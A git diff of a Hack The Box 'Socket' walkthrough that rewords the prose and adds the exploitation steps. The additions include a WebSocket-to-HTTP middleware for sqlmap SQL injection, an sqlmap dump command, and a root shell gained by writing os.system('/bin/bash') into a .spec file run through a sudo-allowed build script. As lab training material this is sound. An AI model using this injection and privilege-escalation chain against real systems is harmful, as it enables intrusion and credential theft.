@@ -6,7 +6,7 @@ https://app.hackthebox.com/machines/Socket
 
 ## Enumeration :
 
-I started with the quick rustscan & found 3 open ports in the machine :
+I began my enumeration by using the rustscan tool, which revealed that there were three open ports on the target machine:
 
     sudo rustscan -a 10.10.11.206 -- -sC -sV -vv -oN socket_nmap
     
@@ -88,31 +88,31 @@ SF:20a\x20valid\x20HTTP\x20request\.\n");
 Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-From port 80 I observed a domain "http://qreader.htb/". I added this domain to /etc/hosts file.
+I noticed that port 80 was hosting a website with the domain "http://qreader.htb/". To access this site, I added the domain to my /etc/hosts file.
 
-I then moved onto the website & found that it's taking the QR code as Input & showing the embedded text present in the QR.
+Upon visiting the site, I discovered that it was accepting QR codes as input and displaying the embedded text from the code.
 
 ![image](https://user-images.githubusercontent.com/87700008/229103303-772de251-d144-473b-b6bc-57aac382dba7.png)
 
-I checked for the sub-directories & found 3 open directories in the results :
+I searched for any subdirectories and found that there were three open directories:
 
 ![image](https://user-images.githubusercontent.com/87700008/229103939-cb6cb1dc-4514-4ed6-9b8e-aa0e7075cadb.png)
 
-Nothing special in the sub-directories as well.
+However, there was nothing particularly noteworthy in these directories.
 
-In our port scan result we observed an open port "5789" where WebSocket is open, so to enumerate that web socket I downloaded this [script](https://github.com/PalindromeLabs/STEWS) from GitHub.
+During my port scan, I noticed that port 5789 had an open WebSocket. To enumerate this WebSocket, I downloaded a script from GitHub called [STEWS](https://github.com/PalindromeLabs/STEWS).
 
     python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789
     
 ![image](https://user-images.githubusercontent.com/87700008/229136259-3425ae45-de4b-4e02-bb33-35fa50066725.png)
 
-After the scanning we found a vulnerable directory at : "ws://qreader.htb:5789", but it's not much helpful.
+After running the script, I discovered a vulnerable directory at ws://qreader.htb:5789, but it did not provide much useful information.
 
-In the website there is a download app option available for windows & Linux, so I downloaded the Windows executable from the website.
+On the website, there was an option to download an app for Windows and Linux. I downloaded the Windows executable from the site.
 
 ![image](https://user-images.githubusercontent.com/87700008/229138351-ebfe702d-2b82-4002-a7fa-9ab283497acd.png)
 
-After downloading the binary I decompiled it using [pycdc](https://github.com/zrax/pycdc/) & found this code in it :
+After downloading the binary, I decompiled it using [pycdc](https://github.com/zrax/pycdc/) and found the following code:
 
 ```
 import cv2
@@ -185,4 +185,209 @@ if __name__ == '__main__':
     return None
 ```
 
-In the code I found a socket domain "ws.qreader.htb" to connect on & I added it to the hosts file.
+While decompiling the downloaded Windows executable, I discovered a socket domain, ws.qreader.htb, which I added to my hosts file for later use.
+
+However, I hit a roadblock and was unable to make any progress. After some research, I check the Hack The Box forum for this machine and learned that there was an SQL injection vulnerability in the code:
+
+```
+def version(self):
+        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
+            'version': VERSION })))
+        data = json.loads(response)
+        if 'error' not in data.keys():
+            version_info = data['message']
+            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
+            self.statusBar().showMessage(msg)
+            return None
+        error = None['error']
+        self.statusBar().showMessage(error)
+```
+After analyzing the decompiled code, I discovered an SQL injection vulnerability in the /version parameter. Using hints from [Rayhan’s middleware to map everything using SQLmap](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html), I made some necessary changes to the script until I received a response.
+
+![image](https://user-images.githubusercontent.com/87700008/229338436-80aacd23-e06a-4f94-837e-b7c3852c8c0c.png)
+
+Using this script, I was able to gain further access to the machine :
+
+```
+from http.server import SimpleHTTPRequestHandler
+from socketserver import TCPServer
+from urllib.parse import unquote, urlparse
+from websocket import create_connection
+
+ws_server = "ws://ws.qreader.htb:5789/version"  #changed the paramter here as per our target.
+
+def send_ws(payload):
+    ws = create_connection(ws_server)
+    # If the server returns a response on connect, use below line   
+    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
+    
+    # For our case, format the payload in JSON
+    message = unquote(payload).replace('\'','\\\"') # replacing " with ' to avoid breaking JSON structure
+    data = '{"version":"%s"}' % message
+
+    ws.send(data)
+    resp = ws.recv()
+    ws.close()
+
+    if resp:
+        return resp
+    else:
+        return ''
+
+def middleware_server(host_port,content_type="text/plain"):
+
+    class CustomHandler(SimpleHTTPRequestHandler):
+        def do_GET(self) -> None:
+            self.send_response(200)
+            try:
+                payload = urlparse(self.path).query.split('=',1)[1]
+            except IndexError:
+                payload = False
+                
+            if payload:
+                content = send_ws(payload)
+            else:
+                content = 'No parameters specified!'
+
+            self.send_header("Content-type", content_type)
+            self.end_headers()
+            self.wfile.write(content.encode())
+            return
+
+    class _TCPServer(TCPServer):
+        allow_reuse_address = True
+
+    httpd = _TCPServer(host_port, CustomHandler)
+    httpd.serve_forever()
+
+
+print("[+] Starting MiddleWare Server")
+print("[+] Send payloads in http://localhost:8081/?id=*")
+
+try:
+    middleware_server(('0.0.0.0',8081))
+except KeyboardInterrupt:
+    pass
+```
+
+In one terminal, I ran Rayhan's script:
+
+```
+python3 sqli.py
+```
+
+In another terminal, I launched SqlMap using the vulnerable /version parameter and the -u option:
+
+```
+sqlmap -u "http://localhost:8081/version?version=0.0.2" --level=5 --risk=3 --batch --dbs --dump
+```
+![image](https://user-images.githubusercontent.com/87700008/229338657-bc22c512-006a-4dab-9b8e-58c1c1c31e33.png)
+
+After only a minute, SqlMap dumped the password hash and other information :
+
+![image](https://user-images.githubusercontent.com/87700008/229338788-17cf2f0e-7bea-4f37-a1e3-0a80a16c561d.png)
+
+I quickly cracked the hash using John The Ripper:
+
+![image](https://user-images.githubusercontent.com/87700008/229338894-47f0396c-dbe1-4fb7-86f2-6641c52ce540.png)
+
+Using the cracked credentials, I tried to log in, but the username "admin" did not work.
+
+However, SqlMap had revealed another user, "Thomas Keller," in its results. I guessed that his username might be in the format "first letter of the first name + last name," which is common in corporate environments.
+
+Using the username "tkeller" along with the cracked password, I was able to log in and obtain the user flag from Thomas's home directory.
+
+![image](https://user-images.githubusercontent.com/87700008/229339142-662aad1c-9079-4205-b249-796569c6bb0d.png)
+
+I used the username "tkeller" along with the cracked credentials & this time it worked.
+I got the user flag in Thomas home directory. (pwn3d!🙂)
+
+![image](https://user-images.githubusercontent.com/87700008/229339231-89911dc1-6997-4d88-8f4e-987b163bbe59.png)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Priv Esc :
+
+To obtain the root flag, I started by checking the sudo permissions (sudo -l) and discovered that, as Thomas, I can run the 'build-installer.sh' script with sudo access:
+
+![image](https://user-images.githubusercontent.com/87700008/229339306-42baff1c-ca56-4c4d-9ddd-044160b4ed81.png)
+
+I checked the script and found this code:
+
+```
+#!/bin/bash
+if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
+  /usr/bin/echo "No enough arguments supplied"
+  exit 1;
+fi
+
+action=$1
+name=$2
+ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')
+
+if [[ -L $name ]];then
+  /usr/bin/echo 'Symlinks are not allowed'
+  exit 1;
+fi
+
+if [[ $action == 'build' ]]; then
+  if [[ $ext == 'spec' ]] ; then
+    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
+    /home/svc/.local/bin/pyinstaller $name
+    /usr/bin/mv ./dist ./build /opt/shared
+  else
+    echo "Invalid file format"
+    exit 1;
+  fi
+elif [[ $action == 'make' ]]; then
+  if [[ $ext == 'py' ]] ; then
+    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
+    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
+   /usr/bin/mv ./dist ./build /opt/shared
+  else
+    echo "Invalid file format"
+    exit 1;
+  fi
+elif [[ $action == 'cleanup' ]]; then
+  /usr/bin/rm -r ./build ./dist 2>/dev/null
+  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
+  /usr/bin/rm /tmp/qreader* 2>/dev/null
+else
+  /usr/bin/echo 'Invalid action'
+  exit 1;
+fi
+```
+
+This part of the code provides hints that we can run a .spec file and become root, as seen here:
+
+```
+  if [[ $ext == 'py' ]] ; then
+    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
+    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
+   /usr/bin/mv ./dist ./build /opt/shared
+  else
+    echo "Invalid file format"
+    exit 1;
+  fi
+```
+
+![image](https://user-images.githubusercontent.com/87700008/229340486-12852eb7-a112-400b-bdef-2beff2ba1740.png)
+
+
+I created a file in the root directory with the following command:
+
+```
+echo 'import os;os.system("/bin/bash")' > /tmp/shell.spec #as per the code we can run .spec file from the /tmp directory
+```
+
+Then I executed the file with the following commands, which gave me root:
+
+```
+sudo /usr/local/sbin/build-installer.sh build /tmp/shell.spec
+```
+
+![image](https://user-images.githubusercontent.com/87700008/229340675-58224dc5-8e9f-4f61-bc72-1f22a3b672c8.png)
+
+I got the root shell & fetched the root flag. (pwn3d!🙂)
+
+
